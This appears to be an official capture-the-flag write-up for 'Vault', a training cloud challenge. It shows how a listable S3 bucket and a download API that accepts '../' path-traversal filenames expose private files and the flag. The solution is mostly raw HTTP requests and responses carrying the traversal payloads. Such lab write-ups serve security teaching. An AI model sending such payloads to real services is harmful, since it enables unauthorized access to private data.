<img src="../../assets/banner.png" style="zoom: 80%;" align=center />

<img src="../../assets/htb.png" style="zoom: 80%;" align='left' /><font size="5">Vault</font>

  4<sup>th</sup> 4 2025

  Prepared By: busfactor

  Challenge Author: busfactor

  Difficulty: <font color=green>Very Easy</font>

  Classification: Official






# Synopsis

- Vault is a Very Easy Cloud challenge that showcases a common S3 misconfiguration in a realistic web application scenario. The application hosts publicly accessible files in an S3 bucket and provides download links through an API that generates presigned URLs. While the public files are expected, the S3 bucket is also improperly configured to expose the contents of a supposedly private directory. By exploiting a path traversal flaw in the API endpoint, it’s possible to request presigned URLs for files stored in the private section of the bucket, ultimately leading to the discovery of the flag.

# Description

During the reconnaissance phase, we discovered Volnaya’s file vault. While it appears to only display public files, our intel suggests it’s also being used to store sensitive information. We need your help retrieving those files—they’re critical to our mission.

URL: http://volnaya-vault-static-website.s3-website.eu-north-1.amazonaws.com/

# Skills Required
- Basic AWS S3 knowledge
- Basic web application knowledge
- Basic API testing

# Skills Learned
- AWS S3 misconfiguration
- Path traversal vulnerability

# Solution

The challenge provides a basic web application hosted on AWS S3. It appears to function as a public vault for Volnaya, allowing users to download files from it.

When clicking the “Download” button, the application sends a request to an API. This triggers a new browser tab to open with a presigned S3 URL, such as:
`https://volnaya-vault.s3.eu-north-1.amazonaws.com/vault/public/[filename]?...`.
This reveals that files are stored in the volnaya-vault S3 bucket, specifically under the vault/public directory.

The S3 bucket is misconfigured to allow directory listing. Visiting `https://volnaya-vault.s3.eu-north-1.amazonaws.com/` in a browser shows the list of files in that directory. Surprisingly, it’s also possible to view files under the `vault/private` directory—despite it not being intended as public. However, direct downloads from `vault/private` are not possible without a valid presigned URL.

```xml
<ListBucketResult xmlns="http://s3.amazonaws.com/doc/2006-03-01/">
  <Name>volnaya-vault</Name>
  <Prefix/>
  <Marker/>
  <MaxKeys>1000</MaxKeys>
  <IsTruncated>false</IsTruncated>
  <Contents>
    <Key>vault/private/DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx</Key>
    <LastModified>2025-04-15T12:03:46.000Z</LastModified>
    <ETag>"65b77ab8075e5be2b5b5ecc30d694c04"</ETag>
    <ChecksumAlgorithm>CRC32</ChecksumAlgorithm>
    <ChecksumType>FULL_OBJECT</ChecksumType>
    <Size>8089</Size>
    <Owner>
      <ID>f1c6d364f7991f7bdaf5a6f5860b1e4890c498b2d8646aa6036e58241a55b689</ID>
    </Owner>
    <StorageClass>STANDARD</StorageClass>
  </Contents>
...
```

Trying to access these files directly in the browser will result in "AccessDenied" errors.

```xml
<Error>
  <Code>AccessDenied</Code>
  <Message>Access Denied</Message>
  <RequestId>WKQAKR0Z6A24V841</RequestId>
  <HostId>P5o8apU8XQ8VYSpps+YekXi9qo/RGEhpQR4KYcGnN8dIzxMqX3gM34vem3Rihoy2K2hleakOfkE=</HostId>
</Error>
```

Looking into the web application’s behavior, it’s possible to inspect the API request responsible for generating these presigned URLs.

```
POST /api/download HTTP/1.1
Host: volnaya-vault-lb-2115334219.eu-north-1.elb.amazonaws.com
Content-Length: 29
Content-Type: application/json

{"filename":"propaganda.png"}
```

This request includes the filename as a parameter. A test can be performed by supplying a `../` sequence in the filename to check for path traversal vulnerabilities, then requesting a known file to observe the behavior.

```
POST /api/download HTTP/1.1
Host: volnaya-vault-lb-2115334219.eu-north-1.elb.amazonaws.com
Content-Length: 29
Content-Type: application/json

{"filename":"propaganda.png/../Vehicle_Log_Update_VZ-TRK-1138.txt"}
```

A valid presigned URL is returned, indicating that the filename is being handled correctly—at least in the case of public files.

```
HTTP/1.1 200 OK
Date: Tue, 15 Apr 2025 12:17:46 GMT
Content-Type: application/json
Content-Length: 1655
Connection: keep-alive
Server: gunicorn

{
    "url": "https://volnaya-vault.s3.eu-north-1.amazonaws.com/vault/public/Vehicle_Log_Update_VZ-TRK-1138.txt?[SNIP]"
}
```

By attempting to retrieve a file located in `vault/private` using path traversal, the API still returns a presigned URL.

```
POST /api/download HTTP/1.1
Host: volnaya-vault-lb-2115334219.eu-north-1.elb.amazonaws.com
Content-Length: 29
Content-Type: application/json

{"filename":"../private/_Post-Assessment Report.pdf"}
```

This confirms that path traversal is possible and is not being properly validated.

```
HTTP/1.1 200 OK
Date: Tue, 15 Apr 2025 12:27:01 GMT
Content-Type: application/json
Content-Length: 1646
Connection: keep-alive
Server: gunicorn
Access-Control-Allow-Origin: http://volnaya-vault-static-website.s3-website.eu-north-1.amazonaws.com
Vary: Origin

{
    "url": "https://volnaya-vault.s3.eu-north-1.amazonaws.com/vault/private/_Post-Assessment%20Report.pdf?..."
}
```

The file `DIRECTORATE ALPHA & BETA FIELD OPERATIVES.docx` contains the flag.
